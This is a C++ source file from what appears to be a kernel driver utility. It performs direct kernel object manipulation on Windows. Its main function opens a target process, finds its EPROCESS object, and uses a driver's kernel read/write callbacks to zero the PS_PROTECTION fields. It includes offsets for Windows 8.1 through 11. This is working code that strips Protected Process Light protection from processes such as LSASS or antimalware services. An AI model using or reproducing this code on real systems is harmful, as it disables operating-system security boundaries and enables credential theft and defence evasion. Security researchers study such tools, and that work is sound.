/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2022
*
*  TITLE:       PS.CPP
*
*  VERSION:     1.27
*
*  DATE:        25 Oct 2022
*
*  Processes DKOM related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

LPSTR KDUGetProtectionTypeAsString(
    _In_ ULONG Type
)
{
    LPSTR pStr;

    switch (Type) {

    case PsProtectedTypeNone:
        pStr = (LPSTR)"PsProtectedTypeNone";
        break;
    case PsProtectedTypeProtectedLight:
        pStr = (LPSTR)"PsProtectedTypeProtectedLight";
        break;
    case PsProtectedTypeProtected:
        pStr = (LPSTR)"PsProtectedTypeProtected";
        break;
    default:
        pStr = (LPSTR)"Unknown Type";
        break;
    }

    return pStr;
}

LPSTR KDUGetProtectionSignerAsString(
    _In_ ULONG Signer
)
{
    LPSTR pStr;

    switch (Signer) {
    case PsProtectedSignerNone:
        pStr = (LPSTR)"PsProtectedSignerNone";
        break;
    case PsProtectedSignerAuthenticode:
        pStr = (LPSTR)"PsProtectedSignerAuthenticode";
        break;
    case PsProtectedSignerCodeGen:
        pStr = (LPSTR)"PsProtectedSignerCodeGen";
        break;
    case PsProtectedSignerAntimalware:
        pStr = (LPSTR)"PsProtectedSignerAntimalware";
        break;
    case PsProtectedSignerLsa:
        pStr = (LPSTR)"PsProtectedSignerLsa";
        break;
    case PsProtectedSignerWindows:
        pStr = (LPSTR)"PsProtectedSignerWindows";
        break;
    case PsProtectedSignerWinTcb:
        pStr = (LPSTR)"PsProtectedSignerWinTcb";
        break;
    case PsProtectedSignerWinSystem:
        pStr = (LPSTR)"PsProtectedSignerWinSystem";
        break;
    case PsProtectedSignerApp:
        pStr = (LPSTR)"PsProtectedSignerApp";
        break;
    default:
        pStr = (LPSTR)"Unknown Value";
        break;
    }

    return pStr;
}

/*
* KDUControlProcess
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUControlProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId)
{
    BOOL       bResult = FALSE;
    ULONG      Buffer;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress = 0, Offset = 0;
    HANDLE     hProcess = NULL;

    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    PS_PROTECTION* PsProtection;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (ProcessObject != 0) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            switch (Context->NtBuildNumber) {
            case NT_WIN8_BLUE:
                Offset = PsProtectionOffset_9600;
                break;
            case NT_WIN10_THRESHOLD1:
                Offset = PsProtectionOffset_10240;
                break;
            case NT_WIN10_THRESHOLD2:
                Offset = PsProtectionOffset_10586;
                break;
            case NT_WIN10_REDSTONE1:
                Offset = PsProtectionOffset_14393;
                break;
            case NT_WIN10_REDSTONE2:
            case NT_WIN10_REDSTONE3:
            case NT_WIN10_REDSTONE4:
            case NT_WIN10_REDSTONE5:
            case NT_WIN10_19H1:
            case NT_WIN10_19H2:
                Offset = PsProtectionOffset_15063;
                break;
            case NT_WIN10_20H1:
            case NT_WIN10_20H2:
            case NT_WIN10_21H1:
            case NT_WIN10_21H2:
            case NT_WIN10_22H2:
            case NT_WIN11_21H2:
            case NT_WIN11_22H2:
            case NTX_WIN11_ADB:
                Offset = PsProtectionOffset_19041;
                break;
            default:
                Offset = 0;
                break;
            }

            if (Offset == 0) {

                supPrintfEvent(kduEventError,
                    "[!] Unsupported WinNT version\r\n");

            }
            else {

                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, Offset);

                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);

                Buffer = 0;               

                if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle, 
                    VirtualAddress, 
                    &Buffer, 
                    sizeof(ULONG))) 
                {
                    PsProtection = (PS_PROTECTION*)&Buffer;

                    LPSTR pStr;

                    printf_s("[+] Kernel memory read succeeded\r\n");

                    pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
                    printf_s("\tPsProtection->Type: %lu (%s)\r\n",
                        PsProtection->Type,
                        pStr);

                    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);

                    pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
                    printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
                        PsProtection->Signer,
                        pStr);

                    PsProtection->Signer = PsProtectedSignerNone;
                    PsProtection->Type = PsProtectedTypeNone;
                    PsProtection->Audit = 0;

                    bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle, 
                        VirtualAddress, 
                        &Buffer, 
                        sizeof(ULONG));

                    if (bResult) {
                        printf_s("[+] Process object modified\r\n");

                        pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
                        printf_s("\tNew PsProtection->Type: %lu (%s)\r\n",
                            PsProtection->Type,
                            pStr);

                        pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
                        printf_s("\tNew PsProtection->Signer: %lu (%s)\r\n",
                            PsProtection->Signer,
                            pStr);

                        printf_s("\tNew PsProtection->Audit: %lu\r\n", PsProtection->Audit);

                    }
                    else {

                        supPrintfEvent(kduEventError,
                            "[!] Cannot modify process object\r\n");

                    }
                }
                else {

                    supPrintfEvent(kduEventError,
                        "[!] Cannot read kernel memory\r\n");

                }
            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Cannot open target process, NTSTATUS (0x%lX)\r\n", ntStatus);

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}
